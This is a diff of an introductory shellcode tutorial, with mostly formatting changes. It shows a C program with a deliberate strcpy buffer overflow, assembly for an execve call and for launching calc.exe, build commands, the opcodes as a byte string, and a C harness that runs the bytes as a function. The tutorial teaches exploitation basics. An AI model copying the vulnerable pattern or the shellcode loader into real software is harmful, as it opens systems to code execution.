@@ -1,10 +1,10 @@
-### shellcode?
+# shellcode?
 
 - a small piece of code used as a payload for exploitation of software.
 - written in assembly language and designed to be injected into memory.
 - primary use is arbitrary code execution.
 
-#### How does Shellcode work?
+## how does shellcode work?
 
 a basic program that is vulnerable to a buffer overflow due to not checking
 lengths passed.
@@ -18,8 +18,8 @@ void no_length_check_function(char *input) {
     strcpy(buffer, input); // do not check the length of the input and copy
 }
 
-// create the 'entrypoint' for the program that takes argc (argument count) and
-// argv (argument variables) as the arguments
+// create the 'entrypoint' for the program that takes argc (argument count)
+// and argv (argument variables) as the arguments
 int main(int argc, char *argv[]) {
     // pass the first argv (argv[1]) which will be the second argument IE:
     // file.exe ARGUMENT1 to the vulnerable function
@@ -28,9 +28,9 @@ int main(int argc, char *argv[]) {
 }
 ```
 
-when compiled allows an attacker to control the EIP by passing more than 100 characters as the argument.
-
-a pseudo shellcode to overwrite the EIP with the following:
+when compiled allows an attacker to control the EIP by passing more than
+100 characters as the argument. a pseudo shellcode to overwrite the EIP
+with the following:
 
 ```asm
 xor eax, eax        ;"\x31\xc0"
@@ -46,7 +46,7 @@ mov al, 0xb         ;(execve syscall number) ;"\xb0\x0b"
 int 0x80            ;(trigger syscall) ;"\xcd\x80"
 ```
 
-#### Let's write some shellcode!
+## let's write some shellcode
 
 a basic assembly program to launch calc.exe.
 
@@ -81,17 +81,18 @@ need two things:
 1. [NASM](https://www.nasm.us/)
 2.[MinGW](https://www.mingw-w64.org/downloads/)
 
-#### Compiling it!
+## compiling it
 
 first compile the shellcode into an object (`.o`) file.
 
 1. `nasm -f win32 .\test_calc.asm -o test_calc.o`
 
-2. Link the object file `gcc -m32 -o test_calc.exe .\test_calc.o "-Wl,-e,_start" -nostdlib`
+2. link the object file
+   `gcc -m32 -o test_calc.exe .\test_calc.o "-Wl,-e,_start" -nostdlib`
 
-#### Adding shellcode to your attack
+## adding shellcode to your attack
 
-```
+```txt
 PS C:\Users\xxx> objdump -d .\test_calc.o
 
 .\test_calc.o:     file format pe-i386
@@ -118,7 +119,7 @@ Disassembly of section .text:
 convert the above to the correct format by copying the opcodes and
 converting them into the `\xnn` format like so:
 
-```
+```txt
 \x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\xb8\x60\x63\xc7\x76\x6a\x01\x53\xff\xd0\x31\xc0\x50\xb0\x01\xb0\x01\xcd\x80
 ```
 
@@ -130,5 +131,6 @@ int main (void) {
 }
 ```
 
-C code calls the `unsigned char` variable as a function and runs it directly i.e. `(*(void(*)()) code)();` is
-a type cast to treat the code as a function pointer without any arguments.
+C code calls the `unsigned char` variable as a function and runs it directly
+i.e. `(*(void(*)()) code)();` is a type cast to treat the code as a function
+pointer without any arguments.
